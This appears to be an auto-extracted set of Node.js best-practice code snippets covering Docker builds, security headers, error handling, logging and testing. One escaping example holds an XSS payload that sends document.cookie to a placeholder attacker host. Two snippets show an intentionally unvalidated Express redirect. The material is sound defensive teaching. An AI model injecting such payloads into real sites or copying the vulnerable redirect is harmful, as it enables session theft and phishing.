COPY --chown=node:node package.json yarn.lock ./
RUN yarn install --frozen-lockfile --production

# Copy results from previous stage
COPY --chown=node:node --from=build /home/node/app/dist ./dist

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Example Multi-Stage Dockerfile for Node.js Application (Dockerfile)
DESCRIPTION: Provides an example Dockerfile implementing a multi-stage build strategy for a Node.js application. The first stage ('build') compiles the application, while the second stage ('node:slim') copies only the necessary production assets and dependencies into a minimal base image, resulting in a smaller, more secure final image. Requires a project structure with a build step and uses npm for dependency management.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_10

LANGUAGE: dockerfile
CODE:
```
FROM node:14.4.0 AS build

COPY . .
RUN npm ci && npm run build


FROM node:slim-14.4.0

USER node
EXPOSE 8080

COPY --from=build /home/node/app/dist /home/node/app/package.json /home/node/app/package-lock.json ./
RUN npm ci --production

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Illustrating Dangerous HTML Injection Points - HTML
DESCRIPTION: This HTML example shows various places within an HTML document where inserting unescaped, untrusted data can lead to security vulnerabilities like Cross-Site Scripting (XSS). It specifically warns against placing such data directly within script tags, HTML comments, attribute names, tag names, and style tags, as browsers may interpret it as executable code or structure. Proper escaping or encoding is required for untrusted inputs in these contexts.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.polish.md#_snippet_0

LANGUAGE: html
CODE:
```
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test \/>       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" \/>   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS
```

----------------------------------------

TITLE: Defining Product Schema JSON
DESCRIPTION: This JSON snippet defines a schema for a "Product" object using the JSON Schema specification. It outlines the required fields ("id", "name", "price"), specifies the data types ("string", "number"), and includes constraints like "exclusiveMinimum" for the price property. This schema can be used by validation libraries to check if a given JSON object conforms to the expected structure.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/validation.french.md#_snippet_0

LANGUAGE: json
CODE:
```
{
    "$schema": "http://json-schema.org/draft-06/schema#",
    "title": "Product",
    "description": "A product from Acme's catalog",
    "type": "object",
    "properties": {
        "name": {
            "description": "Name of the product",
            "type": "string"
        },
        "price": {
            "type": "number",
            "exclusiveMinimum": 0
        }
    },
    "required": ["id", "name", "price"]
}
```

----------------------------------------

TITLE: Defining Product JSON-Schema Rules
DESCRIPTION: Defines a JSON-schema for a "Product" object, specifying properties like name (string) and price (number > 0), and marking id, name, and price as required fields. Used to formally describe the expected data structure for validation.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/validation.md#_snippet_0

LANGUAGE: json
CODE:
```
{
    "$schema": "http://json-schema.org/draft-06/schema#",
    "title": "Product",
    "description": "A product from Acme's catalog",
    "type": "object",
    "properties": {
        "name": {
            "description": "Name of the product",
            "type": "string"
        },
        "price": {
            "type": "number",
            "exclusiveMinimum": 0
        }
    },
    "required": ["id", "name", "price"]
}
```

----------------------------------------

TITLE: Implementing Unsafe Redirect in Express
DESCRIPTION: This snippet shows an Express route handler for '/login' that redirects the user to a URL specified directly in the 'url' query parameter after checking authentication. This method is vulnerable because it trusts user input without validation, potentially allowing attackers to redirect users to external malicious sites.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/saferedirects.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const express = require('express');
const app = express();

app.get('/login', (req, res, next) => {

  if (req.session.isAuthenticated()) {
    res.redirect(req.query.url);
  }

});
```

----------------------------------------

TITLE: Setting X-Frame-Options Header: HTTP Header
DESCRIPTION: This header example sets the X-Frame-Options policy to `deny`. This prevents the application from being embedded in any external pages using frames, thus protecting against Clickjacking attacks.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_2

LANGUAGE: HTTP Header
CODE:
```
X-Frame-Options: deny
```

----------------------------------------

TITLE: Implementing Unsafe Redirect in Express Javascript
DESCRIPTION: This snippet demonstrates a vulnerable Express route handler that directly uses user input from the query parameter 'url' for redirection without any validation. This allows attackers to potentially redirect users to malicious sites.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/saferedirects.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const express = require('express');
const app = express();

app.get('/login', (req, res, next) => {

  if (req.session.isAuthenticated()) {
    res.redirect(req.query.url);
  }

}); 
```

----------------------------------------

TITLE: Configuring Express JSON Payload Limit JavaScript
DESCRIPTION: This snippet demonstrates how to configure an Express application to limit the size of incoming JSON payloads using the built-in `express.json()` middleware. The `limit` option specifies the maximum allowed size (e.g., '300kb'). It also includes a basic POST route handler that checks the content-type before processing, although `express.json` often handles this based on headers.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/requestpayloadsizelimit.french.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
const express = require('express');

const app = express();

app.use(express.json({ limit: '300kb' })); // body-parser defaults to a body size limit of 100kb

// Request with json body
app.post('/json', (req, res) => {

    // Check if request payload content-type matches json, because body-parser does not check for content types
    if (!req.is('json')) {
        return res.sendStatus(415); // -> Unsupported media type if request doesn't have JSON body
    }

    res.send('Hooray, it worked!');
});

app.listen(3000, () => console.log('Example app listening on port 3000!'));
```

----------------------------------------

TITLE: Illustrating Escaped HTML Tags
DESCRIPTION: This snippet shows the same HTML tags as the previous example, but with the angle brackets (< and >) escaped using HTML entities (&lt; and &gt;). This causes the browser to render the tags literally as text rather than interpreting them as formatting instructions, demonstrating the effect of escaping.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.french.md#_snippet_3

LANGUAGE: HTML
CODE:
```
&lt;strong&gt;This is bold text.&lt;/strong&gt;
```

----------------------------------------

TITLE: Demonstrating Anti-Pattern Test Structure in JavaScript
DESCRIPTION: This snippet provides an example of a unit test that does *not* follow the Arrange, Act, Assert (AAA) pattern. All parts of the test (setup, execution, verification) are mixed together, making it harder to quickly understand the test's intent and flow compared to the structured AAA approach. Dependencies include a testing framework (like Jest/Mocha) and potentially a mocking library (like Sinon).
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/aaa.md#_snippet_1

LANGUAGE: javascript
CODE:
```
test('Should be classified as premium', () => {
    const customerToClassify = {spent:505, joined: new Date(), id:1}
    const DBStub = sinon.stub(dataAccess, 'getCustomer')
        .reply({id:1, classification: 'regular'});
    const receivedClassification = customerClassifier.classifyCustomer(customerToClassify);
    expect(receivedClassification).toMatch('premium');
});
```

----------------------------------------

TITLE: Illustrating npm start Process Tree; Console
DESCRIPTION: This console output snippet displays the process tree generated when a Node.js application is started in Docker using `npm start`. It clearly shows the unnecessary intermediate `npm` and shell (`sh -c`) processes between the init process (PID 1, implicitly) and the actual Node.js application process, highlighting the overhead of the `npm start` antipattern.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.french.md#_snippet_4

LANGUAGE: console
CODE:
```
$ ps falx
  UID   PID  PPID   COMMAND
    0     1     0   npm
    0    16     1   sh -c node server.js
    0    17    16    \_ node server.js
```

----------------------------------------

TITLE: Demonstrating Uncaught Error in Promise .then (Javascript)
DESCRIPTION: Shows a common scenario where an error thrown within a promise's `.then` handler is not caught by typical error handlers (`uncaughtException`) if there's no `.catch` clause, leading to potential silent failures unless an `unhandledRejection` handler is present.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/catchunhandledpromiserejection.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
DAL.getUserById(1).then((johnSnow) => {
  // this error will just vanish
  if(johnSnow.isAlive == false)
      throw new Error('ahhhh');
});

```

----------------------------------------

TITLE: Setting NODE_ENV Environment Variable (Shell Script)
DESCRIPTION: This snippet illustrates how to set the NODE_ENV environment variable to 'development' in a bash shell using the standard variable=value syntax before invoking the 'node' command. This ensures the Node.js process inherits the specified environment variable, which is commonly used for configuration differences between environments like development and production. No specific dependencies are required beyond a shell environment.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/setnodeenv.md#_snippet_0

LANGUAGE: shell script
CODE:
```
// Setting environment variables in bash before starting the node process
$ NODE_ENV=development
$ node
```

----------------------------------------

TITLE: Excluding Files in .dockerignore
DESCRIPTION: This snippet shows example entries for a `.dockerignore` file. It demonstrates how to prevent specific directories and files, such as `node_modules` and `docs`, from being copied into the Docker build context, which helps optimize build performance and final image size.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.md#_snippet_0

LANGUAGE: .dockerignore
CODE:
```
node_modules

docs
```

----------------------------------------

TITLE: Setting Referrer-Policy Header: HTTP Header
DESCRIPTION: This header example sets the Referrer-Policy to `no-referrer`. This completely removes the `Referer` header from requests, enhancing privacy by preventing the destination site from knowing the origin URL.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_5

LANGUAGE: HTTP Header
CODE:
```
Referrer-Policy: no-referrer
```

----------------------------------------

TITLE: Basic Multi-Stage Docker Build (Node.js)
DESCRIPTION: This Dockerfile defines a two-stage build process for a Node.js application using the same base image for both stages. The first stage ('build') copies source, installs dependencies, and builds the app. The second stage copies build artifacts and production dependencies from the first stage to create a smaller runtime image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:14.4.0 AS build

COPY --chown=node:node . .
RUN yarn install --frozen-lockfile && yarn build


FROM node:14.4.0

USER node
EXPOSE 8080

# Copy results from previous stage
COPY --chown=node:node --from=build /home/node/app/dist /home/node/app/package.json /home/node/app/yarn.lock ./
RUN yarn install --frozen-lockfile --production

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Benchmarking Concatenation Performance - JavaScript
DESCRIPTION: This snippet sets up and runs a performance benchmark using the `benchmark` library. It compares the speed of concatenating elements to an array using Lodash's `_.concat`, Underscore's `__.concat`, and the native JavaScript `Array.concat` method. It requires `lodash`, `underscore`, and `benchmark` dependencies.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/nativeoverutil.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const _ = require('lodash');
const __ = require('underscore');
const Suite = require('benchmark').Suite;
const opts = require('./utils'); //cf. https://github.com/Berkmann18/NativeVsUtils/blob/master/utils.js

const concatSuite = new Suite('concat', opts);
const array = [0, 1, 2];

concatSuite.add('lodash', () => _.concat(array, 3, 4, 5))
  .add('underscore', () => __.concat(array, 3, 4, 5))
  .add('native', () => array.concat(3, 4, 5))
  .run({ 'async': true });
```

----------------------------------------

TITLE: Anti-pattern: Throwing String in JavaScript
DESCRIPTION: Illustrates an anti-pattern where a simple string is thrown instead of an Error object. This approach is discouraged because it results in a loss of crucial information, most notably the stack trace, and hinders interoperability with APIs that expect Error instances.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/useonlythebuiltinerror.md#_snippet_1

LANGUAGE: javascript
CODE:
```
// throwing a string lacks any stack trace information and other important data properties
if(!productToAdd)
    throw ('How can I add new product when no value provided?');
```

----------------------------------------

TITLE: Demonstrating ESLint Non-Native Usage Flagging - JavaScript
DESCRIPTION: This JavaScript snippet demonstrates how the configured ESLint plugin detects and flags the use of non-native utility methods. It shows requiring 'lodash' and then using `_.map`, which the plugin (when configured) will identify as potentially replaceable by the native `Array.prototype.map`.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/nativeoverutil.french.md#_snippet_2

LANGUAGE: javascript
CODE:
```
const _ = require('lodash');
// ESLint will flag the line above with a suggestion
console.log(_.map([0, 1, 2, 4, 8, 16], x => `d${x}`));
```

----------------------------------------

TITLE: Initializing and Using Pino Logger in Node.js
DESCRIPTION: This JavaScript snippet demonstrates how to initialize a Pino logger instance and then use its 'info' method to log a message. It illustrates adding contextual metadata as a JSON object and formatting the log message string. This requires the 'pino' npm package.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/usematurelogger.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
const pino = require('pino');

// your centralized logger object
const logger = pino();

// custom code somewhere using the logger
logger.info({ anything: 'This is metadata' }, 'Test Log Message with some parameter %s', 'some parameter');
```

----------------------------------------

TITLE: Managing TransactionId with Continuation-Local-Storage
DESCRIPTION: This snippet demonstrates an alternative approach to managing request-local context using the `continuation-local-storage` library, which was commonly used before `async-local-storage` became available/stable. It shows how to create a namespace, set a transaction ID within a route handler, and access it from another module (a service or logger) within the same request's asynchronous flow.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/assigntransactionid.md#_snippet_3

LANGUAGE: JavaScript
CODE:
```
// when receiving a new request, start a new isolated context and set a transaction id. The following example is using the npm library continuation-local-storage to isolate requests

const { createNamespace } = require('continuation-local-storage');
const session = createNamespace('my session');

router.get('/:id', (req, res, next) => {
    session.set('transactionId', 'some unique GUID');
    someService.getById(req.params.id);
    logger.info('Starting now to get something by id');
});

// Now any other service or components can have access to the contextual, per-request, data
class someService {
    getById(id) {
        logger.info('Starting to get something by id');
        // other logic comes here
    }
}

// The logger can now append the transaction id to each entry so that entries from the same request will have the same value
class logger {
    info (message) {
        console.log(`${message} ${session.get('transactionId')}`);
    }
}
```

----------------------------------------

TITLE: Setting Expect-CT Header: HTTP Header
DESCRIPTION: This example sets the Expect-CT policy. It enforces Certificate Transparency compliance for the host for 2592000 seconds (one week) and specifies a URI to report any Certificate Transparency failures. This helps detect mis-issued certificates.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_6

LANGUAGE: HTTP Header
CODE:
```
Expect-CT: max-age=2592000, enforce, report-uri="https://example.com/report-cert-transparency"
```

----------------------------------------

TITLE: Prettier Formatting (After) - JavaScript
DESCRIPTION: Shows the same function call after being automatically formatted by Prettier. Arguments are wrapped onto new lines to improve readability and adhere to standard style guides.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/codestylepractices/eslint_prettier.japanese.md#_snippet_1

LANGUAGE: javascript
CODE:
```
foo(\n  reallyLongArg(),\n  omgSoManyParameters(),\n  IShouldRefactorThis(),\n  isThereSeriouslyAnotherOne(),\n  noWayYouGottaBeKiddingMe()\n);
```

----------------------------------------

TITLE: Best Practice: Awaiting Promise Before Returning in Javascript
DESCRIPTION: This snippet shows the recommended practice. The `returnWithAwait` async function calls `throwAsync` and uses `await` before returning the result. This ensures that if `throwAsync` throws an error, the `returnWithAwait` frame is included in the stacktrace, providing a complete call chain for debugging.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/returningpromises.md#_snippet_1

LANGUAGE: javascript
CODE:
```
async function throwAsync(msg) {
  await null // need to await at least something to be truly async (see note #2)
  throw Error(msg)
}

async function returnWithAwait() {
  return await throwAsync('with all frames present')
}

// 👍 will have returnWithAwait in the stacktrace
returnWithAwait().catch(console.log)
```

----------------------------------------

TITLE: Example Hierarchical Configuration Structure JSON
DESCRIPTION: This JSON snippet demonstrates a hierarchical structure for application configuration. It groups related settings, such as database connection details and credit limits for the 'Customer' module, into nested objects. This approach improves readability and maintainability compared to a flat key-value list, making it easier to manage large configuration files.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/projectstructre/configguide.korean.md#_snippet_0

LANGUAGE: JSON
CODE:
```
{
  "Customer": {
    "dbConfig": {
      "host": "localhost",
      "port": 5984,
      "dbName": "customers"
    },
    "credit": {
      "initialLimit": 100,
      "initialDays": 1
    }
  }
}
```

----------------------------------------

TITLE: Illustrating Ambiguous Test Naming (JavaScript)
DESCRIPTION: This JavaScript snippet shows an anti-pattern for test naming. The test name ("Should return the right status") is generic and requires the reader to examine the test body (`expect` call) to understand the specific conditions and expected outcome being tested. This makes test reports less informative and harder to interpret quickly.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/3-parts-in-name.md#_snippet_1

LANGUAGE: javascript
CODE:
```
describe('Products Service', () => {
  describe('Add new product', () => {
    it('Should return the right status', () => {
      //hmm, what is this test checking? what are the scenario and expectation?
      const newProduct = new ProductService().add(...);
      expect(newProduct.status).to.equal('pendingApproval');
    });
  });
});
```

----------------------------------------

TITLE: Anti-Pattern: Handling Errors Directly in Middleware - Node.js Typescript
DESCRIPTION: Shows an anti-pattern in Typescript where an Express-style middleware directly handles error processing (logging, sending mail based on severity) instead of delegating to a centralized handler. This approach hinders reusability for errors outside the request context. Requires `logger`, `mailer`, configuration objects, and express types (`Error`, `Request`, `Response`, `NextFunction`).
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/centralizedhandling.md#_snippet_5

LANGUAGE: typescript
CODE:
```
// middleware handling the error directly, who will handle Cron jobs and testing errors?
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  logger.logError(err);
  if (err.severity == errors.high) {
    mailer.sendMail(configuration.adminMail, 'Critical error occured', err);
  }
  if (!err.isOperational) {
    next(err);
  }
});
```

----------------------------------------

TITLE: Antipattern: Starting Node.js App with CMD string form - Dockerfile
DESCRIPTION: Shows another antipattern using the string form `CMD "node server.js"`. This approach implicitly starts a shell (`sh` or `bash`), adding an unnecessary process layer and potentially interfering with signal handling, similar to `npm start`.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.md#_snippet_3

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm clean cache --force

# don’t do that, it will start bash
CMD "node server.js"
```

----------------------------------------

TITLE: Configuring ESLint Plugin: You Don't Need Lodash/Underscore (JSON)
DESCRIPTION: This JSON snippet provides the configuration required within an ESLint configuration file (like .eslintrc.json) to enable the `eslint-plugin-you-dont-need-lodash-underscore`. By extending the 'plugin:you-dont-need-lodash-underscore/compatible' configuration, ESLint will start detecting and suggesting replacements for non-native utility method usages. Requires the `eslint-plugin-you-dont-need-lodash-underscore` npm package.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/nativeoverutil.md#_snippet_1

LANGUAGE: json
CODE:
```
{
  "extends": [
    "plugin:you-dont-need-lodash-underscore/compatible"
  ]
}
```

----------------------------------------

TITLE: Nginx Configuration for Gzip and Static Files
DESCRIPTION: This Nginx configuration snippet demonstrates how to enable gzip compression for responses, define an upstream group for Node.js application instances, set up a server block listening on ports 80 and 443 (with SSL), and configure location rules to serve static files efficiently from a specified root directory.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/delegatetoproxy.korean.md#_snippet_0

LANGUAGE: nginx
CODE:
```
# configure gzip compression
gzip on;
gzip_comp_level 6;
gzip_vary on;

# configure upstream
upstream myApplication {
    server 127.0.0.1:3000;
    server 127.0.0.1:3001;
    keepalive 64;
}

#defining web server
server {
    # configure server with ssl and error pages
    listen 80;
    listen 443 ssl;
    ssl_certificate /some/location/sillyfacesociety.com.bundle.crt;
    error_page 502 /errors/502.html;

    # handling static content
    location ~ ^/(images/|img/|javascript/|js/|css/|stylesheets/|flash/|media/|static/|robots.txt|humans.txt|favicon.ico) {
    root /usr/local/silly_face_society/node/public;
    access_log off;
    expires max;
}

```

----------------------------------------

TITLE: Using PM2 in Dockerfile CMD - Anti-Pattern
DESCRIPTION: This code snippet illustrates an anti-pattern where an in-container process manager, PM2 ('pm2-runtime'), is used as the Dockerfile's CMD. While PM2 can manage the Node.js process inside the container, this hides the actual application process state from the Docker orchestrator. This prevents the orchestrator from making informed decisions about scaling, restarts, and placement based on the application's true health or resource usage.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/restart-and-replicate-processes.french.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim

# The build logic comes here

CMD ["pm2-runtime", "indes.js"]
```

----------------------------------------

TITLE: Process Tree with npm start Antipattern - Console
DESCRIPTION: Displays the process tree output from `ps falx` when a Node.js application is started using the `npm start` antipattern. It clearly shows the extra `npm` and shell (`sh -c`) processes running before the actual Node.js application, illustrating the overhead and signal handling issues of this approach.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.md#_snippet_4

LANGUAGE: console
CODE:
```
$ ps falx
  UID   PID  PPID   COMMAND
    0     1     0   npm
    0    16     1   sh -c node server.js
    0    17    16    \_ node server.js
```

----------------------------------------

TITLE: Decrypting Secrets with Cryptr in Node.js Javascript
DESCRIPTION: This snippet illustrates how to use the `cryptr` library to decrypt a sensitive string stored in an encrypted format. It requires the `cryptr` package and an encryption key, which is ideally loaded from an environment variable (`process.env.SECRET`) for security. The `decrypt` method is used with the encrypted string to retrieve the original plain text.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secretmanagement.md#_snippet_1

LANGUAGE: javascript
CODE:
```
const Cryptr = require('cryptr');
const cryptr = new Cryptr(process.env.SECRET);
 
let accessToken = cryptr.decrypt('e74d7c0de21e72aaffc8f2eef2bdb7c1');
 
console.log(accessToken);  // outputs decrypted string which was not stored in source control
```

----------------------------------------

TITLE: Example of Malicious Script Injection - HTML/JavaScript
DESCRIPTION: This snippet provides a realistic example of malicious content that could be injected into a web application's database, such as a comment section. When rendered by a browser without proper escaping, the embedded <script> tag executes, potentially stealing the user's cookie (document.cookie) and sending it to an attacker's site. This highlights the importance of escaping user-provided content before rendering.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.md#_snippet_1

LANGUAGE: html
CODE:
```
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

----------------------------------------

TITLE: Illustrating Vulnerable HTML Injection Points - HTML
DESCRIPTION: This snippet demonstrates common locations within an HTML document where untrusted data should never be inserted directly without proper escaping. These locations include inside <script> tags, HTML comments, attribute names, tag names, and <style> tags. Inserting untrusted data directly into these areas is highly vulnerable to Cross-Site Scripting (XSS) attacks.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.md#_snippet_0

LANGUAGE: html
CODE:
```
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

----------------------------------------

TITLE: Setting Docker Container Memory Limit - Bash
DESCRIPTION: This command runs a Docker container for a Node.js application and sets a hard memory limit using the `--memory` flag. This restricts the maximum memory the container can consume at the OS/container runtime level.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/memory-limit.md#_snippet_0

LANGUAGE: Bash
CODE:
```
docker run --memory 512m my-node-app
```

----------------------------------------

TITLE: Setting X-XSS-Protection Header: HTTP Header
DESCRIPTION: This example enables the browser's built-in Cross-site scripting (XSS) filter (`1`) and configures it to report any detected violations to the specified example URL. This provides a first line of defense against XSS attacks.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_3

LANGUAGE: HTTP Header
CODE:
```
X-XSS-Protection: 1; report=http://example.com/xss-report
```

----------------------------------------

TITLE: Applying Code Style for Curly Braces (JavaScript)
DESCRIPTION: Demonstrates the preferred code style for placing the opening curly brace on the same line as the function declaration in JavaScript, contrasting it with the non-preferred style where the brace is on the next line. Following this convention helps maintain consistent code style and avoids potential parsing issues related to Automatic Semicolon Insertion.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_3

LANGUAGE: javascript
CODE:
```
// Do
function someFunction() {
  // code block
}

// Avoid
function someFunction()
{
  // code block
}
```

----------------------------------------

TITLE: Starting Node.js App with CMD Exec Form - Dockerfile
DESCRIPTION: Shows the recommended method for starting a Node.js application in a Docker container using the exec form `CMD ["node", "server.js"]`. This ensures proper signal handling and avoids an extra shell process, facilitating graceful shutdowns and correct child process cleanup.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm clean cache --force

CMD ["node", "server.js"]
```

----------------------------------------

TITLE: Benchmarking Concat Performance: Native vs Lodash/Underscore (JavaScript)
DESCRIPTION: This JavaScript code uses the 'benchmark' library to compare the performance of array concatenation using native `Array.concat`, Lodash's `_.concat`, and Underscore's `__.concat`. It sets up a benchmark suite and adds tests for each method, then runs them asynchronously to measure execution time. Requires 'lodash', 'underscore', and 'benchmark' dependencies.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/nativeoverutil.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const _ = require('lodash');
const __ = require('underscore');
const Suite = require('benchmark').Suite;
const opts = require('./utils'); //cf. https://github.com/Berkmann18/NativeVsUtils/blob/master/utils.js

const concatSuite = new Suite('concat', opts);
const array = [0, 1, 2];

concatSuite.add('lodash', () => _.concat(array, 3, 4, 5))
  .add('underscore', () => __.concat(array, 3, 4, 5))
  .add('native', () => array.concat(3, 4, 5))
  .run({ 'async': true });
```

----------------------------------------

TITLE: Best Practice: Wrapping Async Callback for Sync Expecting Function in Javascript
DESCRIPTION: This snippet provides a workaround when you cannot change the function expecting a synchronous callback (like `Array.prototype.map`). It wraps the async function call `getUser(id)` inside a new `async` lambda function that explicitly uses `await`. Passing this new `async` lambda to `map` ensures the line where `getUser` is called is preserved in the stacktrace upon error, making it easier to pinpoint the failure location.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/returningpromises.md#_snippet_5

LANGUAGE: javascript
CODE:
```
async function getUser (id) {
  await null
  if (!id) throw Error('with all frames present')
  return {id}
}

const userIds = [1, 2, 0, 3]

// 👍 now the line below is in the stacktrace
Promise.all(userIds.map(async id => await getUser(id))).catch(console.log)
```

----------------------------------------

TITLE: Displaying GraphQL Error Response (JSON)
DESCRIPTION: Provides an example of a standard JSON error response returned by a GraphQL API when a query fails, specifically showing the "errors" array with details like message, location, and path, alongside a "data" field indicating a null result for the requested item.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/documentingusingswagger.md#_snippet_1

LANGUAGE: json
CODE:
```
{
  "errors": [
    {
      "message": "No entry in local cache for https://swapi.co/api/films/.../",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ],
      "path": [
        "film"
      ]
    }
  ],
  "data": {
    "film": null
  }
}
```

----------------------------------------

TITLE: Simplifying TransactionId with cls-rtracer in Express.js
DESCRIPTION: This example shows how to use the `cls-rtracer` library, built on `async-local-storage`, to simplify transaction ID management in an Express application. The library provides a middleware that automatically handles setting the ID, and a simple function `rTracer.id()` to retrieve it anywhere within the request context. A custom logger demonstrates accessing the ID.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/assigntransactionid.md#_snippet_1

LANGUAGE: JavaScript
CODE:
```
const express = require('express');
const rTracer = require('cls-rtracer');

const app = express();

app.use(rTracer.expressMiddleware());

app.get('/getUserData/{id}', async (req, res, next) => {
    try {
        const user = await usersRepo.find(req.params.id);

        // The TransactionId is reachable from inside the logger, there's no need to send it over
        logger.info(`user ${user.id} data was fetched successfully`);

        res.json(user);
    } catch (err) {
        // The error is being passed to the middleware
        next(err);
    }
})

// Error handling middleware calls the logger
app.use(async (err, req, res, next) => {
    await logger.error(err);
});

// The logger can now append the TransactionId to each entry so that entries from the same request will have the same value
class logger {
    error(err) {
        console.error(`${err} ${rTracer.id()}`);
    }
    
    info(message) {
        console.log(`${message} ${rTracer.id()}`);
    }
}
```

----------------------------------------

TITLE: Generating Heap Dump via Maintenance Endpoint (JavaScript)
DESCRIPTION: This JavaScript code snippet demonstrates how to implement a maintenance endpoint route using Express.js (`router`) that generates a heap dump (memory snapshot) of the Node.js process using the `heapdump` library. It includes an authorization check (`isAuthorized`) to ensure only authorized users can access this sensitive functionality and reads the generated snapshot file to send it back as the response.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/createmaintenanceendpoint.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const heapdump = require('heapdump');

// Check if request is authorized 
function isAuthorized(req) {
    // ...
}

router.get('/ops/heapdump', (req, res, next) => {
    if (!isAuthorized(req)) {
        return res.status(403).send('You are not authorized!');
    }

    logger.info('About to generate heapdump');

    heapdump.writeSnapshot((err, filename) => {
        console.log('heapdump file is ready to be sent to the caller', filename);
        fs.readFile(filename, 'utf-8', (err, data) => {
            res.end(data);
        });
    });
});
```

----------------------------------------

TITLE: Example Formatted Code (After Prettier) - JavaScript
DESCRIPTION: This JavaScript snippet shows the same function call as the previous example, but formatted by Prettier. Prettier automatically breaks the long line by placing each argument on a new line, demonstrating its capability to automatically fix formatting issues like excessive line length for improved readability.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/codestylepractices/eslint_prettier.md#_snippet_1

LANGUAGE: JavaScript
CODE:
```
foo(
  reallyLongArg(),
  omgSoManyParameters(),
  IShouldRefactorThis(),
  isThereSeriouslyAnotherOne(),
  noWayYouGottaBeKiddingMe()
